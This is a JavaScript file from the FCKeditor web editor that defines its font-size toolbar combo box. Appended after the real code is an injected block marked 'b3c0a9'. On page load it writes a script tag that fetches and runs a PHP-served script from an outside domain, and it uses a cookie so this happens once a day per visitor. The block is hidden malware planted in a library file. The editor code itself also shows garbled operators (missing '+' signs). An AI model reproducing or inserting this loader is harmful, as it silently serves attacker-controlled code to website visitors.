﻿/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fcktoolbarfontsizecombo.js
 * 	FCKToolbarPanelButton Class: Handles the Fonts combo selector.
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

var FCKToolbarFontSizeCombo = function( tooltip, style )
{
	this.Command	= FCKCommands.GetCommand( 'FontSize' ) ;
	this.Label		= this.GetLabel() ;
	this.Tooltip	= tooltip ? tooltip : this.Label ;
	this.Style		= style ? style : FCK_TOOLBARITEM_ICONTEXT ;
}

// Inherit from FCKToolbarSpecialCombo.
FCKToolbarFontSizeCombo.prototype = new FCKToolbarSpecialCombo ;

FCKToolbarFontSizeCombo.prototype.GetLabel = function()
{
	return FCKLang.FontSize ;
}

FCKToolbarFontSizeCombo.prototype.CreateItems = function( targetSpecialCombo )
{
	targetSpecialCombo.FieldWidth = 70 ;
	
	var aSizes = FCKConfig.FontSizes.split(';') ;
	
	for ( var i = 0 ; i < aSizes.length ; i   )
	{
		var aSizeParts = aSizes[i].split('/') ;
		this._Combo.AddItem( aSizeParts[0], '<font size="'   aSizeParts[0]   '">'   aSizeParts[1]   '</font>', aSizeParts[1] ) ;
	}
}

/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
